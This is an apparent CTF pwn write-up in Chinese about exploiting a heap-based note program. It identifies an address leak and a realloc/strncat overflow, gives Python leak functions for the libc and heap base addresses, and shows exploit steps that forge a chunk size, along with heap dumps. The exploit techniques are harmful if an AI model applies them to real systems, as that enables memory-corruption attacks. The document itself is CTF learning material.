
## checksec

```Assembly
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      PIE enabled
```

## struct

```C
struct struc_note
{
  int64 flg_edit;
  int64 length;
  int64 next_addr;
  int64 befor_addr;
  int64 content_addr;
};

typedef struc_note note_struct;
typedef note_struct * note_ptr;
```
## vuln
1. read有地址泄露
2. realloc和strncat结合可以构成溢出


### realloc

```
The realloc() function changes the size of the memory block pointed to by ptr to size bytes.  The contents will  be  unchanged  in  the
range  from the start of the region up to the minimum of the old and new sizes.  If the new size is larger than the old size, the added
memory will not be initialized.  If ptr is NULL, then the call is equivalent to malloc(size), for all values of size; if size is  equal
to  zero,  and ptr is not NULL, then the call is equivalent to free(ptr).  Unless ptr is NULL, it must have been returned by an earlier
call to malloc(), calloc() or realloc().  If the area pointed to was moved, a free(ptr) is done.
```
不是太懂最后一句的moved什么意思

### strncat
man手册给了示例代码
```C
char *
strncat(char *dest, const char *src, size_t n)
{
    size_t dest_len = strlen(dest);
    size_t i;

    for (i = 0 ; i < n && src[i] != '\0' ; i++)
        dest[dest_len + i] = src[i];
    dest[dest_len + i] = '\0';

    return dest;
}
```
可以看到，对于目的缓冲区，用的是strlne函数来算结尾


## leak
泄露很简单
```C
for ( i = 0; i < n; ++i )
{
  if ( read(0, &c, 1uLL) <= 0 )
    break;
  a[i] = c;
  if ( a[i] == '\n' )
    break;
}
```
利用read_buf存在泄露

### libc

利用smallbin
```Python
def s_leak():
    libc_base_addr = 0
    add_note(0xf8, 'l'*0xf0+'\n')
    add_note(0xf8, 'k'*0xf0+'\n')
    delete_note(1)
    payload = 'e'*0x07+'\n'
    add_note(0xf8, payload)
    list_note()
    io.recvuntil(payload)
    data = io.recvuntil('\n')[:-1]
    libc_base_addr = u64(data.ljust(0x08, chr(0))) - smlbin_area_off
    delete_note(1)
    delete_note(1)
    return libc_base_addr
```

### heap
利用地址未清零
```Python
def lk_heap():
    heap_addr = 0
    payload = 'c'*0x0F+'\n'
    add_note(0x20, payload)
    list_note()
    io.recvuntil(payload)
    data = io.recvuntil('\n')[:-1]
    heap_addr = u64(data.ljust(0x08, chr(0))) - 0x10
    delete_note(1)
    return heap_addr
```


## exp

```Python
add_note(0x10, 'v' * 0x10)
add_note(0x18, 'a' * 0x18)      # 8
add_note(0x100, 'f' * 0x100)    # 9
add_note(0x20, '\x01' * 0x20)   # 10
delete_note(9)
add_note(0x30, '/bin/sh\x00\n')
```
把0x100大小的smallbin删除，再去掉其中一部分，这样就有0xd0大小的smallbin
```Assembly
000055A4C70EC770  ...              00000000000000D1
000055A4C70EC780         fd              bk
000055A4C70EC790  6161616161616161 6666666666666666
000055A4C70EC7A0  6666666666666666 6666666666666666
000055A4C70EC7B0  6666666666666666 6666666666666666
000055A4C70EC7C0  6666666666666666 6666666666666666
000055A4C70EC7D0  6666666666666666 6666666666666666
000055A4C70EC7E0  6666666666666666 6666666666666666
000055A4C70EC7F0  6666666666666666 6666666666666666
000055A4C70EC800  6666666666666666 6666666666666666
000055A4C70EC810  6666666666666666 6666666666666666
000055A4C70EC820  6666666666666666 6666666666666666
000055A4C70EC830  6666666666666666 6666666666666666
000055A4C70EC840  0000000000000000
```

然后只要expand一个大小大概为0xD0的块<br>
realloc就会返回000055A4C70EC780<br>
> 这里因为expand的块的后面的块已经被分配了，而原来的size又比realloc小，所以realloc会去找空的smallbin，这里就找到了realloc就会返回000055A4C70EC780

### 修改指针?????
尝试修改下一个块的指针会发现，由于有个flg_edit，即使能够修改后面的content的指针，也无法对其地址进行修改。


### size exp
可以修改一下块的大小
```Python
fake_scc = chr(1) * (0x7) + p64(0xd1)[:3] + '\n'
expand_note(8, 0xb0, fake_scc)
```

```Assembly
000055A4C70EC840  01010101010101D0 00000000000000d1
000055A4C70EC850  0000000000000000 0000000000000020         <-----note
000055A4C70EC860  000055A4C70EC710 000055A4C70EC6C0
000055A4C70EC870  000055A4C70EC880 0000000000000031
000055A4C70EC880  0101010101010101 0101010101010101         <-----content10
000055A4C70EC890  0101010101010101 0101010101010101
000055A4C70EC8A0  0000000000000000 0000000000020761
```
这样，只要free_note，这样就会得到一些空间。<br>
再free之前，再这个块的后面add个note11，释放，再malloc，就足够控制note11了
